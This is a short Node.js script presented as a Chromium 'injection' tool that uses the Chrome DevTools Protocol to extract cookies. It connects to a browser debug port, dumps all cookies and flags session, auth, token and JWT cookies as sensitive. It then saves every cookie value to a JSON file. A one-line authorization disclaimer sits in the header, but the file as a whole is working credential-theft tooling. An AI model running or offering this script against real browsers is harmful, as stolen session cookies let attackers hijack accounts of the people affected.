#!/usr/bin/env node
/**
 * macOS Chromium Injection - Cookie Extraction via CDP
 * Usage: node extract-cookies.js [host] [port]
 *
 * Only use on systems you own or have explicit authorization to test.
 */

import CDP from 'chrome-remote-interface';
import { writeFileSync } from 'fs';

const HOST = process.argv[2] || '127.0.0.1';
const PORT = parseInt(process.argv[3]) || 9222;
const OUTPUT_FILE = process.argv[4] || 'extracted-cookies.json';

console.log(`[+] Connecting to CDP at ${HOST}:${PORT}`);

(async () => {
  try {
    const client = await CDP({ host: HOST, port: PORT });
    const { Network, Target } = client;

    await Network.enable();

    // Get all cookies
    const { cookies } = await Network.getAllCookies();

    console.log(`[+] Extracted ${cookies.length} cookies`);
    console.log('');

    // Group by domain
    const byDomain = {};
    cookies.forEach(cookie => {
      if (!byDomain[cookie.domain]) {
        byDomain[cookie.domain] = [];
      }
      byDomain[cookie.domain].push(cookie);
    });

    // Print summary
    console.log('Cookies by domain:');
    Object.entries(byDomain).forEach(([domain, domainCookies]) => {
      console.log(`  ${domain}: ${domainCookies.length} cookies`);
      domainCookies.forEach(c => {
        const sensitive = ['session', 'auth', 'token', 'csrf', 'jwt'].some(k => c.name.toLowerCase().includes(k));
        const marker = sensitive ? ' [SENSITIVE]' : '';
        console.log(`    - ${c.name}${marker}`);
      });
    });

    // Save to file
    writeFileSync(OUTPUT_FILE, JSON.stringify({
      extracted_at: new Date().toISOString(),
      total_cookies: cookies.length,
      cookies: cookies
    }, null, 2));

    console.log('');
    console.log(`[+] Cookies saved to ${OUTPUT_FILE}`);

    await client.close();
  } catch (error) {
    console.error(`[!] Error: ${error.message}`);
    process.exit(1);
  }
})();
